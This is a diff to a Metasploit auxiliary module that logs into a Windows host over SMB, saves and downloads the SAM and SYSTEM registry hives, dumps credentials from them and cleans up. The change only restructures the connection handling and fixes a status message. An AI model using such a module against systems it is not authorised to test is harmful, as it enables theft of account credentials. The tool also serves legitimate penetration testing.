@@ -50,23 +50,24 @@ class Metasploit3 < Msf::Auxiliary
 		hives = [sampath, syspath]
 		smbshare = datastore['SMBSHARE']
 
-		connect()
-		begin
-			smb_login()
-		rescue StandardError => autherror
-			print_error("#{ip} - #{autherror}")
-			return
-		end
-
-		if save_reg_hives(smbshare, ip, sampath, syspath)
-			d = download_hives(smbshare, sampath, syspath, ip, logdir)
-			sys, sam = open_hives(logdir, ip, hives)
-			if d
-				dump_creds(sam, sys, ip)
+		if connect
+			begin
+				smb_login
+			rescue StandardError => autherror
+				print_error("#{ip} - #{autherror}")
+				return
 			end
+
+			if save_reg_hives(smbshare, ip, sampath, syspath)
+				d = download_hives(smbshare, sampath, syspath, ip, logdir)
+				sys, sam = open_hives(logdir, ip, hives)
+				if d
+					dump_creds(sam, sys, ip)
+				end
+			end
+			cleanup_after(smbshare, ip, sampath, syspath)
+			disconnect
 		end
-		cleanup_after(smbshare, ip, sampath, syspath)
-		disconnect()
 	end
 
 
@@ -128,7 +129,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# This is the cleanup method.  deletes copies of the hive files from the windows temp directory
 	def cleanup_after(smbshare, ip, sampath, syspath)
-		print_status("#{ip} - Running cleanup on")
+		print_status("#{ip} - Running cleanup.")
 		begin
 			# Try and do cleanup
 			simple.connect(smbshare)
